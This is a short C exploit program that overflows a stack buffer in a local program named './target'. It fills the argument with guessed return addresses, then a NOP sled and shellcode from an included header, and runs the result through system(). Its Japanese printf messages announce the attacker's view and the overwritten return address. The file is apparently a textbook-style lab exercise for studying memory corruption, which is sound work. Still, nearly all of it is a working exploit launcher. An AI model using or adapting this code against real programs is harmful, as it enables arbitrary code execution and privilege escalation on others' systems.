#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"shellcode.h"

int main(int argc, char **argv){
	unsigned int i, ret_addr, offset = 0;
	unsigned char *command, *buffer;

	command = malloc(200);
	bzero(command, 200);
	strcpy(command, "./target \'");
	buffer = command + strlen(command);

	if(argc == 2) offset = atoi(argv[1]);
	ret_addr = (unsigned int) &i - offset;

	for(i = 0; i < 40; i += 4) *((unsigned int*) (buffer+i)) = ret_addr;
	memcpy(buffer + 40, nop_sled, sizeof(nop_sled) - 1);
	memcpy(buffer + 40 + sizeof(nop_sled) - 1, shellcode, sizeof(shellcode) - 1);
	strcat(command, "\'");

	printf("##### 攻撃側の情報 #####\n");
	printf("ターゲットのリターンアドレスを 0x%08x に書き換えます\n\n", ret_addr);

	system(command);
	free(command);
	
	return 0;
}
